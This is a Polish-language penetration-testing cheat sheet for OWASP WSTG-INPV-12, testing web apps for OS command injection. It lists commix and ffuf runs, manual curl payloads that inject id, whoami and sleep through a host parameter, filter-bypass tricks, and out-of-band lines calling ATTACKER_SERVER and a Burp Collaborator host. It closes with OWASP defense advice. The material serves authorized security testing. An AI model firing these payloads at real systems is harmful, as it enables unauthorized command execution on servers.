# WSTG-INPV-12 — Testing for Command Injection

## Cele

- Identify and assess command injection points
- Bypass special characters and OS commands filter

## KOMENDY

### commix - automatyczny skaner command injection

```bash
commix -u "https://TARGET/ping?host=127.0.0.1" --batch
commix -u "https://TARGET/ping?host=127.0.0.1" --batch --os-cmd="id"

```

### Reczne testowanie - Linux

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;id"
curl -s "https://TARGET/ping?host=127.0.0.1|id"
curl -s "https://TARGET/ping?host=127.0.0.1||id"
curl -s "https://TARGET/ping?host=127.0.0.1&&id"
curl -s "https://TARGET/ping?host=\$(id)"
curl -s "https://TARGET/ping?host=127.0.0.1%0aid"
curl -s "https://TARGET/ping?host=\`id\`"

```

### Reczne testowanie - Windows

```bash
curl -s "https://TARGET/ping?host=127.0.0.1&whoami"
curl -s "https://TARGET/ping?host=127.0.0.1|whoami"
curl -s "https://TARGET/ping?host=127.0.0.1||whoami"

```

### Blind command injection (time-based)

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;sleep 5" -o /dev/null -w "%{time_total}\n"
curl -s "https://TARGET/ping?host=127.0.0.1|sleep 5" -o /dev/null -w "%{time_total}\n"

```

### Out-of-band

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;curl ATTACKER_SERVER"
curl -s "https://TARGET/ping?host=127.0.0.1;nslookup ATTACKER.burpcollaborator.net"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Command Injection

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command_exec.txt" -mc all -o output_ffuf_cmdi.json

ffuf -u "https://TARGET/ping?host=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command-execution-unix.txt" -mc all -o output_ffuf_cmdi_unix.json

```

### SecLists command injection commix

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/command-injection-commix.txt -mc all -o output_ffuf_seclists_cmdi.json

```

### fuzzdb command injection

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/command-execution-unix.txt -mc all -o output_ffuf_fuzzdb_cmdi.json
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/Commands-Linux.txt -mc all -o output_ffuf_fuzzdb_linux.json
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/shell-operators.txt -mc all -o output_ffuf_fuzzdb_operators.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj funkcje ktore moga wykonywac komendy systemowe (ping, DNS lookup, traceroute, file operations)
2. Testuj rozne separatory komend: ; | || && \n \`\` $()
3. Sprawdz blind injection przez opoznienie (sleep) lub OOB (curl/nslookup)
4. Testuj bypass filtrow: kodowanie URL, podwojne kodowanie, wildcardy
5. Testuj bypass blacklist: us%65rname, /b??/cat, \w\h\o\a\m\i
6. Uzyj Burp Collaborator do detekcji blind command injection


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — OS_Command_Injection_Defense_Cheat_Sheet.md

- UNIKAJ wywolan systemowych calkowicie — uzywaj natywnych API jezyka programowania
- Jesli musisz: NIGDY nie konkatenuj user input do komend — uzywaj parameterized APIs
- Allowlist validation: ogranicz dopuszczalne znaki (alfanumeryczne, bez ; | & ` $ > < itd.)
- Uzywaj bibliotek/wrapperow ktore nie uruchamiaja shella (np. subprocess z list args w Python)
- Uruchamiaj procesy z minimalnymi uprawnieniami (principle of least privilege)

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Command Injection Attacker | Generator payloadow OS command injection | [GitHub](https://github.com/portswigger/command-injection-attacker) |
| Argument Injection Hammer | Wykrywanie argument injection | [GitHub](https://github.com/nccgroup/argumentinjectionhammer) |
